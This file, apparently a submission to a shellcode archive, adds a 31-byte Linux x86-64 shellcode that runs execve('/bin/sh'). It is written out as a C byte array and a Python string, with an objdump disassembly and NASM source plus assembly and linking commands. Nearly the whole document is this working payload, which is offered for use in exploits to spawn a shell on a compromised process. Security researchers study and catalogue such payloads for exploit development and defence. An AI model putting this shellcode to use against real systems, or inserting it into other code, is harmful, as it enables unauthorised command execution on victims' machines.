@@ -1,0 +1,85 @@
+Hi, This time I wanna to submit a shellcode whose length is 31Bytes , It's
+tested on Linux x86-64
+;===========================================================
+=====================
+; The MIT License
+;
+; Copyright (c) <year> <copyright holders>
+;
+; Permission is hereby granted, free of charge, to any
+person obtaining a copy
+; of this software and associated documentation files (the "
+Software"), to deal
+; in the Software without restriction, including without
+limitation the rights
+; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+; copies of the Software, and to permit persons to whom the Software is
+; furnished to do so, subject to the following conditions:
+;
+; The above copyright notice and this permission notice shall be included in
+; all copies or substantial portions of the Software.
+;
+; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN
+NO EVENT SHALL THE
+; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHER
+WISE, ARISING FROM,
+; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+; THE SOFTWARE.
+;===========================================================
+=====================
+;     Name : Linux/x86-64 - execve("/bin/sh") 31 Bytes
+;     Author : WangYihang
+;     Email : wangyihanger@gmail.com
+;     Tested on: Linux_x86-64
+;===========================================================
+=====================
+; Shellcode (c array) :
+char shellcode[] = "
+\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05
+";
+;===========================================================
+=====================
+; Shellcode (python) :
+shellcode = "
+\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05
+"
+;===========================================================
+=====================
+; objdump -d ./shellcode
+shellcode:     file format elf64-x86-64
+Disassembly of section .text:
+0000000000400080 <_start>:
+  400080: 48 31 ff             xor    %rdi,%rdi
+  400083: 48 31 f6             xor    %rsi,%rsi
+  400086: 48 31 d2             xor    %rdx,%rdx
+  400089: 48 31 c0             xor    %rax,%rax
+  40008c: 50                   push   %rax
+  40008d: 48 bb 2f 62 69 6e 2f movabs $0x68732f2f6e69622f,%rbx
+  400094: 2f 73 68
+  400097: 53                   push   %rbx
+  400098: 48 89 e7             mov    %rsp,%rdi
+  40009b: b0 3b                 mov    $0x3b,%al
+  40009d: 0f 05                 syscall ============================
+=====================
+; Assembly language code :
+; You can asm it by using :
+; nasm -f elf64 ./shellcode.asm
+; ld -o shellcode shellcode.o
+global _start
+_start:
+xor rdi, rdi
+xor rsi, rsi
+xor rdx, rdx
+xor rax, rax
+push rax
+; 68 73 2f 2f 6e 69 62 2f
+mov rbx, 68732f2f6e69622fH
+push rbx
+mov rdi, rsp
+mov al, 59
+syscall
+;===========================================================
+=====================
